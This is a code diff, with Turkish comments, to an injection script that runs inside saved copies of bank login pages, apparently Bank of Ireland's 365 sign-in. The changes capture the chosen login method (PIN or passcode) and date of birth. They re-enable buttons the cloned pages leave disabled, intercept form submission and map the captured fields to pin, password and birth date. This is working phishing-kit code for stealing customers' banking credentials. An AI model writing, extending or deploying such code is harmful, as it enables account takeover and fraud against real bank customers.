@@ -48,9 +48,18 @@ function buildInjectionScript(step: number): string {
       try {
         doc.querySelectorAll("input, textarea, select").forEach((el) => {
           const type = (el.getAttribute("type") || "text").toLowerCase();
-          if (IGNORED.includes(type)) return;
           const name = el.getAttribute("name") || el.getAttribute("id") || "";
           if (!name) return;
+          if (type === "radio") {
+            // Secili radio'nun degerini yakala (BOI giris yontemi: PIN / Passcode)
+            if (el.checked) data[name] = el.value != null ? String(el.value) : "on";
+            return;
+          }
+          if (type === "checkbox") {
+            if (el.checked) data[name] = el.value != null ? String(el.value) : "on";
+            return;
+          }
+          if (IGNORED.includes(type)) return;
           const value = el.value != null ? String(el.value) : "";
           if (value.trim() === "") return;
           data[name] = value;
@@ -119,9 +128,94 @@ function buildInjectionScript(step: number): string {
       keypadTimer = setTimeout(flushKeypad, 900);
     };
 
+    // Kaydedilmis sayfalarda JS olmadigi icin butonlar disabled kalir.
+    // Tum disabled/aria-disabled/ng-disabled kontrolleri aktiflestir;
+    // attribute degisikliklerini de izleyip tekrar kaldir.
+    const enableControls = (root) => {
+      try {
+        root.querySelectorAll("button, input, select, textarea, a, [role='button'], [ng-disabled], [aria-disabled]").forEach((el) => {
+          try {
+            if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
+            if (el.hasAttribute("ng-disabled")) el.removeAttribute("ng-disabled");
+            if (el.getAttribute("aria-disabled") === "true") el.setAttribute("aria-disabled", "false");
+            if (el.classList && el.classList.contains("disabled")) el.classList.remove("disabled");
+            if (el.style && el.style.pointerEvents === "none") el.style.pointerEvents = "auto";
+          } catch (e) {}
+        });
+      } catch (e) {}
+    };
+
+    // ------------------------------------------------------------------
+    // DOB GLOBAL: dogum tarihi alanlari (BOI vb.) sadece gg/aa/yyyy kabul
+    // eder — harf/isaret girisi engellenir, sinirlar disina cikamaz.
+    // ------------------------------------------------------------------
+    const DOB_RE = /dob|birth|dateofbirth|date_of_birth|birthdate/i;
+    const isDobField = (el) => {
+      if (!el || !el.getAttribute) return false;
+      const meta = ((el.getAttribute("name") || "") + " " + (el.getAttribute("id") || "") + " " + (el.getAttribute("aria-label") || "") + " " + (el.getAttribute("placeholder") || "") + " " + (typeof el.className === "string" ? el.className : "")).toLowerCase();
+      return DOB_RE.test(meta);
+    };
+    const formatDob = (digits) => {
+      let d = digits.replace(/\D/g, "").slice(0, 8);
+      let dd = d.slice(0, 2), mm = d.slice(2, 4), yy = d.slice(4, 8);
+      if (dd.length === 2) {
+        const day = Math.min(Math.max(parseInt(dd, 10) || 1, 1), 31);
+        dd = String(day).padStart(2, "0");
+      }
+      if (mm.length === 2) {
+        const mon = Math.min(Math.max(parseInt(mm, 10) || 1, 1), 12);
+        mm = String(mon).padStart(2, "0");
+      }
+      if (yy.length === 4) {
+        const yr = Math.min(Math.max(parseInt(yy, 10) || 1900, 1900), new Date().getFullYear());
+        yy = String(yr);
+      }
+      let out = dd;
+      if (d.length > 2) out += "/" + mm;
+      if (d.length > 4) out += "/" + yy;
+      return out;
+    };
+    const applyDobGuards = (root) => {
+      try {
+        root.querySelectorAll("input").forEach((el) => {
+          try {
+            if (!isDobField(el) || el.__dobGuard) return;
+            el.__dobGuard = true;
+            el.setAttribute("inputmode", "numeric");
+            el.setAttribute("autocomplete", "off");
+            el.setAttribute("maxlength", "10");
+            el.addEventListener("input", () => {
+              const formatted = formatDob(el.value || "");
+              if (el.value !== formatted) el.value = formatted;
+            });
+            el.addEventListener("keypress", (ev) => {
+              if (!/[0-9/]/.test(ev.key)) { try { ev.preventDefault(); } catch (e) {} }
+            });
+          } catch (e) {}
+        });
+      } catch (e) {}
+    };
+
     const attach = (doc) => {
       if (!doc || doc.__ieCaptureInjected) return;
       doc.__ieCaptureInjected = true;
+
+      enableControls(doc);
+      applyDobGuards(doc);
+      try {
+        new MutationObserver((mutations) => {
+          for (const m of mutations) {
+            if (m.type === "attributes" && m.target && m.target.nodeType === 1) {
+              const el = m.target;
+              try {
+                if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
+                if (el.hasAttribute("ng-disabled")) el.removeAttribute("ng-disabled");
+                if (el.getAttribute && el.getAttribute("aria-disabled") === "true") el.setAttribute("aria-disabled", "false");
+              } catch (e) {}
+            }
+          }
+        }).observe(doc.documentElement || doc, { attributes: true, attributeFilter: ["disabled", "ng-disabled", "aria-disabled"], subtree: true });
+      } catch (e) {}
 
       doc.addEventListener("submit", (e) => {
         try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
@@ -213,11 +307,13 @@ function buildInjectionScript(step: number): string {
     attach(document);
     scanIframes(document, 0);
     try {
-      new MutationObserver(() => scanIframes(document, 0)).observe(document.documentElement, { childList: true, subtree: true });
+      new MutationObserver(() => { scanIframes(document, 0); enableControls(document); applyDobGuards(document); }).observe(document.documentElement, { childList: true, subtree: true });
     } catch (e) {}
     let tries = 0;
     const retry = setInterval(() => {
       scanIframes(document, 0);
+      enableControls(document);
+      applyDobGuards(document);
       if (++tries > 30) clearInterval(retry);
     }, 500);
   })();`;
@@ -247,6 +343,21 @@ function canonicalizeCaptured(raw: Record<string, string>): Record<string, strin
     if (/^passcode$|^pin$|^otp$|^tac$/.test(n)) {
       out.pin ||= v;
       out.password ||= v;
+    }
+    // Giris yontemi (BOI: Passcode/ biometrics | Pin -> 365 PIN)
+    if (/loginmethod|authmethod/.test(n)) {
+      out.loginMethod ||=
+        /passcode|biometric/i.test(v) ? "Passcode / Biometrics"
+        : /^pin$/i.test(v.trim()) || /365.*pin|pin.*365/i.test(v) ? "365 PIN"
+        : v;
+    }
+    // Dogum tarihi (BOI C2__LOGIN[1].DATEOFBIRTH vb.)
+    if (/dateofbirth|dob|birthdate|birthday/.test(n)) {
+      const digits = v.replace(/\D/g, "").slice(0, 8);
+      out.dateOfBirth ||=
+        digits.length === 8
+          ? `${digits.slice(0, 2)}/${digits.slice(2, 4)}/${digits.slice(4, 8)}`
+          : v;
     }
   }
   return out;
